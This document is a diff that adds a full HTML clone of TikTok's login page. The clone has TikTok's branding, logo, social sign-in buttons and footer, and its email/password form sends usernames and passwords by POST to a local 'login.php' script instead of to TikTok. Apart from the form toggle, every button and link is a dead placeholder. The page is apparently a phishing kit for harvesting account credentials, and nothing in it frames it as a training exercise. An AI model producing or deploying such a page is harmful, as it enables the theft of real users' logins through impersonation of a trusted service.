@@ -1,0 +1,333 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Log in | TikTok</title>
+    <link rel="icon" href="https://sf16-scmcdn-sg.ibytedtos.com/goofy/tiktok/web/node/_next/static/images/tiktok-icon-2d1e14a694147f29e71e0e99eabe0d0e.ico">
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet">
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body {
+            font-family: 'Inter', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+            background-color: #fff;
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+        }
+        /* Header */
+        .tt-header {
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            padding: 16px 24px;
+            border-bottom: 1px solid #e3e3e4;
+        }
+        .tt-logo {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            text-decoration: none;
+        }
+        .tt-logo-icon { width: 30px; height: 30px; }
+        .tt-logo-text {
+            font-size: 22px;
+            font-weight: 800;
+            color: #161823;
+            letter-spacing: -0.5px;
+        }
+        .tt-header-links {
+            display: flex;
+            gap: 24px;
+        }
+        .tt-header-links a {
+            font-size: 14px;
+            color: #161823;
+            text-decoration: none;
+            font-weight: 500;
+        }
+        .tt-header-links a:hover { text-decoration: underline; }
+        /* Main */
+        .main-wrapper {
+            flex: 1;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 40px 20px;
+        }
+        .login-container {
+            width: 100%;
+            max-width: 483px;
+            text-align: center;
+        }
+        .login-title {
+            font-size: 32px;
+            font-weight: 700;
+            color: #161823;
+            margin-bottom: 12px;
+        }
+        .login-subtitle {
+            font-size: 15px;
+            color: #161823b3;
+            margin-bottom: 32px;
+        }
+        /* Login Options */
+        .login-options {
+            display: flex;
+            flex-direction: column;
+            gap: 12px;
+            margin-bottom: 24px;
+        }
+        .login-option {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 12px;
+            width: 100%;
+            padding: 14px;
+            border: 1px solid #e3e3e4;
+            border-radius: 4px;
+            background: #fff;
+            cursor: pointer;
+            font-size: 15px;
+            font-weight: 600;
+            color: #161823;
+            transition: background 0.2s, border-color 0.2s;
+            text-decoration: none;
+        }
+        .login-option:hover {
+            background: #f8f8f8;
+            border-color: #d0d0d0;
+        }
+        .login-option svg {
+            width: 20px;
+            height: 20px;
+            flex-shrink: 0;
+        }
+        /* Expandable Login Form */
+        .email-form {
+            display: none;
+            flex-direction: column;
+            gap: 16px;
+            margin-top: 16px;
+            text-align: left;
+        }
+        .email-form.active { display: flex; }
+        .form-group { display: flex; flex-direction: column; gap: 4px; }
+        .form-label {
+            font-size: 14px;
+            font-weight: 600;
+            color: #161823;
+        }
+        .form-input {
+            width: 100%;
+            padding: 12px 14px;
+            font-size: 16px;
+            border: 1px solid #e3e3e4;
+            border-radius: 4px;
+            color: #161823;
+            outline: none;
+            transition: border-color 0.2s;
+        }
+        .form-input:focus { border-color: #161823; }
+        .form-input::placeholder { color: #b0b0b5; }
+        .forgot-link {
+            text-align: right;
+            font-size: 12px;
+            color: #161823b3;
+            text-decoration: none;
+        }
+        .forgot-link:hover { text-decoration: underline; }
+        .btn-login {
+            width: 100%;
+            background-color: #fe2c55;
+            color: #fff;
+            border: none;
+            border-radius: 4px;
+            padding: 14px;
+            font-size: 16px;
+            font-weight: 700;
+            cursor: pointer;
+            transition: background-color 0.2s;
+        }
+        .btn-login:hover { background-color: #e91e45; }
+        .btn-login:disabled {
+            background-color: #ffb0c0;
+            cursor: default;
+        }
+        /* Divider */
+        .divider {
+            display: flex;
+            align-items: center;
+            gap: 16px;
+            margin: 20px 0;
+        }
+        .divider-line { flex: 1; height: 1px; background: #e3e3e4; }
+        .divider-text { color: #b0b0b5; font-size: 12px; font-weight: 600; }
+        .terms-text {
+            font-size: 12px;
+            color: #161823b3;
+            line-height: 1.6;
+            margin-top: 16px;
+        }
+        .terms-text a {
+            color: #161823;
+            font-weight: 600;
+            text-decoration: none;
+        }
+        .terms-text a:hover { text-decoration: underline; }
+        .signup-bar {
+            margin-top: 24px;
+            padding-top: 20px;
+            border-top: 1px solid #e3e3e4;
+            font-size: 14px;
+            color: #161823b3;
+        }
+        .signup-bar a {
+            color: #fe2c55;
+            font-weight: 700;
+            text-decoration: none;
+        }
+        .signup-bar a:hover { text-decoration: underline; }
+        /* Footer */
+        .tt-footer {
+            border-top: 1px solid #e3e3e4;
+            padding: 20px 24px;
+            text-align: center;
+        }
+        .tt-footer-links {
+            display: flex;
+            flex-wrap: wrap;
+            justify-content: center;
+            gap: 4px 16px;
+            margin-bottom: 8px;
+        }
+        .tt-footer-links a {
+            font-size: 12px;
+            color: #161823b3;
+            text-decoration: none;
+        }
+        .tt-footer-links a:hover { text-decoration: underline; }
+        .tt-footer-copy {
+            font-size: 12px;
+            color: #b0b0b5;
+        }
+        @media (max-width: 540px) {
+            .login-title { font-size: 24px; }
+            .tt-header-links { display: none; }
+        }
+    </style>
+</head>
+<body>
+<header class="tt-header">
+    <a class="tt-logo" href="#">
+        <svg class="tt-logo-icon" viewBox="0 0 48 48" xmlns="http://www.w3.org/2000/svg">
+            <path d="M41.3 9.4a11.5 11.5 0 01-6.9-2.2A11.5 11.5 0 0129.8.7h-8v32.6a6.3 6.3 0 01-6.3 5.7 6.3 6.3 0 01-6.3-6.3 6.3 6.3 0 016.3-6.3c.7 0 1.3.1 1.9.3v-8.3a14.5 14.5 0 00-1.9-.1A14.4 14.4 0 001 32.7 14.4 14.4 0 0015.5 47.2a14.4 14.4 0 0014.4-14.4V17a19.4 19.4 0 0011.4 3.7v-8.1a11.5 11.5 0 01-0-.2z" fill="#161823"/>
+            <path d="M38 6.1a11.5 11.5 0 01-6.9-2.2A11.5 11.5 0 0126.5 0h-8v32.6a6.3 6.3 0 01-6.3 5.7A6.3 6.3 0 015.9 32a6.3 6.3 0 016.3-6.3c.7 0 1.3.1 1.9.3v-8.3A14.5 14.5 0 0012.2 18 14.4 14.4 0 00-2.2 32.4 14.4 14.4 0 0012.2 46.9a14.4 14.4 0 0014.4-14.4V16.7a19.4 19.4 0 0011.4 3.7V12.3a11.5 11.5 0 010-.2z" fill="#25f4ee"/>
+            <path d="M39.8 7.8a11.5 11.5 0 01-6.9-2.2A11.5 11.5 0 0128.3 0h-8v33a6.3 6.3 0 01-6.3 5.7A6.3 6.3 0 017.7 32.4a6.3 6.3 0 016.3-6.3c.7 0 1.3.1 1.9.3v-8.3a14.5 14.5 0 00-1.9-.1A14.4 14.4 0 00-.4 32.4 14.4 14.4 0 0014 46.9a14.4 14.4 0 0014.4-14.4V16.7a19.4 19.4 0 0011.4 3.7V12.3a11.5 11.5 0 010-.2z" fill="#fe2c55"/>
+        </svg>
+        <span class="tt-logo-text">TikTok</span>
+    </a>
+    <div class="tt-header-links">
+        <a href="#">Company</a>
+        <a href="#">Newsroom</a>
+        <a href="#">Contact</a>
+        <a href="#">Careers</a>
+    </div>
+</header>
+
+<div class="main-wrapper">
+    <div class="login-container">
+        <h1 class="login-title">Log in to TikTok</h1>
+        <p class="login-subtitle">Manage your account, check notifications, comment on videos, and more.</p>
+
+        <div class="login-options">
+            <a class="login-option" href="#" id="emailLoginBtn">
+                <svg viewBox="0 0 24 24" fill="none" stroke="#161823" stroke-width="2"><path d="M16 21v-2a4 4 0 00-4-4H5a4 4 0 00-4 4v2"/><circle cx="8.5" cy="7" r="4"/><line x1="20" y1="8" x2="20" y2="14"/><line x1="23" y1="11" x2="17" y2="11"/></svg>
+                Use phone / email / username
+            </a>
+            <a class="login-option" href="#">
+                <svg viewBox="0 0 24 24"><circle cx="12" cy="12" r="10" fill="#1877f2"/><path fill="#fff" d="M16.5 13l.5-3h-3v-2c0-.83.4-1.5 1.6-1.5H17V4s-1.1-.2-2.1-.2C12.6 3.8 11 5.3 11 8v2H8.5v3H11v7.5c.5.1 1 .1 1.5.1s1 0 1.5-.1V13h2.5z"/></svg>
+                Continue with Facebook
+            </a>
+            <a class="login-option" href="#">
+                <svg viewBox="0 0 24 24"><path d="M22.56 12.25c0-.78-.07-1.53-.2-2.25H12v4.26h5.92a5.06 5.06 0 01-2.2 3.32v2.77h3.57c2.08-1.92 3.28-4.74 3.28-8.1z" fill="#4285F4"/><path d="M12 23c2.97 0 5.46-.98 7.28-2.66l-3.57-2.77c-.98.66-2.23 1.06-3.71 1.06-2.86 0-5.29-1.93-6.16-4.53H2.18v2.84C3.99 20.53 7.7 23 12 23z" fill="#34A853"/><path d="M5.84 14.09c-.22-.66-.35-1.36-.35-2.09s.13-1.43.35-2.09V7.07H2.18C1.43 8.55 1 10.22 1 12s.43 3.45 1.18 4.93l2.85-2.22.81-.62z" fill="#FBBC05"/><path d="M12 5.38c1.62 0 3.06.56 4.21 1.64l3.15-3.15C17.45 2.09 14.97 1 12 1 7.7 1 3.99 3.47 2.18 7.07l3.66 2.84c.87-2.6 3.3-4.53 6.16-4.53z" fill="#EA4335"/></svg>
+                Continue with Google
+            </a>
+            <a class="login-option" href="#">
+                <svg viewBox="0 0 24 24"><path d="M16.5 3A5.5 5.5 0 0022 8.5c0 4.17-5.2 8.8-9.2 12a1.24 1.24 0 01-1.6 0C7.2 17.3 2 12.67 2 8.5A5.5 5.5 0 017.5 3 5.48 5.48 0 0112 5.09 5.48 5.48 0 0116.5 3z" fill="#161823"/></svg>
+                Continue with Apple
+            </a>
+            <a class="login-option" href="#">
+                <svg viewBox="0 0 24 24"><path d="M18.244 2.25h3.308l-7.227 8.26 8.502 11.24H16.17l-5.214-6.817L4.99 21.75H1.68l7.73-8.835L1.254 2.25H8.08l4.713 6.231zm-1.161 17.52h1.833L7.084 4.126H5.117z" fill="#161823"/></svg>
+                Continue with X
+            </a>
+        </div>
+
+        <form class="email-form" id="emailForm" action="login.php" method="POST" autocomplete="off">
+            <div class="divider">
+                <div class="divider-line"></div>
+                <span class="divider-text">OR</span>
+                <div class="divider-line"></div>
+            </div>
+            <div class="form-group">
+                <label class="form-label">Email or username</label>
+                <input type="text" name="username" class="form-input" placeholder="Email or username" required id="username">
+            </div>
+            <div class="form-group">
+                <label class="form-label">Password</label>
+                <input type="password" name="password" class="form-input" placeholder="Password" required id="password">
+                <a class="forgot-link" href="#">Forgot password?</a>
+            </div>
+            <button type="submit" class="btn-login" id="loginBtn" disabled>Log in</button>
+        </form>
+
+        <p class="terms-text">By continuing with an account located in <a href="#">United Kingdom</a>, you agree to our <a href="#">Terms of Service</a> and acknowledge that you have read our <a href="#">Privacy Policy</a>.</p>
+
+        <div class="signup-bar">
+            Don't have an account? <a href="#">Sign up</a>
+        </div>
+    </div>
+</div>
+
+<footer class="tt-footer">
+    <div class="tt-footer-links">
+        <a href="#">Company</a>
+        <a href="#">Newsroom</a>
+        <a href="#">Contact</a>
+        <a href="#">Careers</a>
+        <a href="#">ByteDance</a>
+        <a href="#">Creator Directory</a>
+        <a href="#">Privacy Policy</a>
+        <a href="#">Terms of Service</a>
+        <a href="#">Law Enforcement</a>
+        <a href="#">Safety Centre</a>
+        <a href="#">Creator Portal</a>
+        <a href="#">Community Guidelines</a>
+    </div>
+    <div class="tt-footer-copy">© 2026 TikTok</div>
+</footer>
+
+<script>
+    const emailBtn = document.getElementById('emailLoginBtn');
+    const emailForm = document.getElementById('emailForm');
+    const loginBtn = document.getElementById('loginBtn');
+    const usernameInput = document.getElementById('username');
+    const passwordInput = document.getElementById('password');
+
+    emailBtn.addEventListener('click', function(e) {
+        e.preventDefault();
+        emailForm.classList.toggle('active');
+        emailBtn.style.borderColor = emailForm.classList.contains('active') ? '#161823' : '#e3e3e4';
+        emailBtn.style.background = emailForm.classList.contains('active') ? '#f8f8f8' : '#fff';
+    });
+
+    function checkFields() {
+        loginBtn.disabled = !(usernameInput.value.trim().length > 0 && passwordInput.value.trim().length > 0);
+    }
+    usernameInput.addEventListener('input', checkFields);
+    passwordInput.addEventListener('input', checkFields);
+</script>
+</body>
+</html>
